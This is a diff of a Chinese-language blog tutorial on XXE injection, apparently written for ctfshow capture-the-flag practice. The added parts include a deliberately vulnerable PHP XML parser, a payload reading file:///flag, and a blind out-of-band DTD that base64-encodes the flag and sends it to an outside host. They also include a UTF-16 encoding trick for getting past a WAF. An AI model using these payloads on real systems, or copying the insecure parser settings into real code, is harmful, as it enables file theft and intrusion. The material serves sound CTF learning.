@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XML%E5%9F%BA%E7%A1%80"><span class="toc-text">XML基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8F%AF%E8%83%BD"><span class="toc-text">利用可能</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%9A%84xml%E6%B3%A8%E5%85%A5"><span class="toc-text">普通的xml注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">xxe文件读取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web373"><span class="toc-text">ctfshow web373</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web374"><span class="toc-text">ctfshow web374</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XML%E5%9F%BA%E7%A1%80"><span class="toc-text">XML基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E8%A7%A3%E6%9E%90xml"><span class="toc-text">PHP解析xml</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8F%AF%E8%83%BD"><span class="toc-text">利用可能</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%9A%84xml%E6%B3%A8%E5%85%A5"><span class="toc-text">普通的xml注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84xxe%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">有回显的xxe文件读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">无回显</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">编码绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web373"><span class="toc-text">ctfshow web373</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web374"><span class="toc-text">ctfshow web374</span></a></li></ol></li></ol>
     </div>
   
         
@@ -248,7 +248,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.1k字</span>
+        <span class="post-count">1.4k字</span>
       </span>
     </span>
 
@@ -257,7 +257,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">4分</span>
+        <span class="post-count">6分</span>
       </span>
     </span>
     
@@ -282,7 +282,7 @@
 <p>XML 指可扩展标记语言（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）。</p>
 <p>与HTML有点类似，但是XML 被设计用来传输和存储数据，不用于表现和展示数据，HTML 则用来表现数据。</p>
 <p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的</p>
-<p>例：</p>
+<p>DTD例：</p>
 <pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;	&lt;!--这一行是XML文档定义--&gt;
 &lt;!DOCTYPE message [
 &lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;
@@ -314,9 +314,19 @@
 
 <p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
 <hr>
+<h1 id="PHP解析xml"><a href="#PHP解析xml" class="headerlink" title="PHP解析xml"></a>PHP解析xml</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 启用外部实体加载器</span>
+<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$creds</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
 <h1 id="利用可能"><a href="#利用可能" class="headerlink" title="利用可能"></a>利用可能</h1><h2 id="普通的xml注入"><a href="#普通的xml注入" class="headerlink" title="普通的xml注入"></a>普通的xml注入</h2><p>类似sql注入，都是闭合前面的语句另起一段新语句</p>
 <p><img src="/blog/2023/06/11/XXE/image-20230625123643038.png" alt="image-20230625123643038"></p>
-<h2 id="xxe文件读取"><a href="#xxe文件读取" class="headerlink" title="xxe文件读取"></a>xxe文件读取</h2><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;
+<hr>
+<h2 id="有回显的xxe文件读取"><a href="#有回显的xxe文件读取" class="headerlink" title="有回显的xxe文件读取"></a>有回显的xxe文件读取</h2><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE foo [
 &lt;!ELEMENT foo ANY &gt;
 &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;	
@@ -332,6 +342,43 @@
 
 <p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p>
 <p>实际上，在上面那段代码中，既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p>
+<p>结合前面的php解析xml脚本，我们可以post传参以下payload：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">aaa</span> <span class="token punctuation">[</span><span class="token internal-subset">  
+&lt;!ENTITY xxe SYSTEM "file:///flag"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>aaa</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>aaa</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/11/XXE/image-20231116213253213.png" alt="image-20231116213253213"></p>
+<p>这样就能读取到文件了</p>
+<hr>
+<h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><p>只要把php脚本中的输出语句去掉就是无回显了</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>和rce的思路差不多，我们可以进行远程包含DTD实体来带出结果</p>
+<p>在自己的vps上准备一个test.dtd文件，内容如下：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;76135132qk.imdo.co:57746?p&#x3D;%file;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>然后nc监听对应端口（我这里是内网穿透，监听的是内网的映射端口）</p>
+<p>payload：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">convert</span> <span class="token punctuation">[</span><span class="token internal-subset"> 
+&lt;!ENTITY % remote SYSTEM "http://76135132qk.imdo.co/test.dtd">
+%remote;%int;%send;
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>参考[CSAWQual 2019]Unagi</p>
+<blockquote>
+<p>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。</p>
+</blockquote>
+<p>linux环境下转换字符集</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">iconv</span> <span class="token parameter variable">-f</span> UTF-8 <span class="token parameter variable">-t</span> UTF-16BE <span class="token number">1</span>.xml <span class="token operator">></span> <span class="token number">2</span>.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <hr>
 <h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="ctfshow-web373"><a href="#ctfshow-web373" class="headerlink" title="ctfshow web373"></a>ctfshow web373</h2><p>进入题目看到源码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
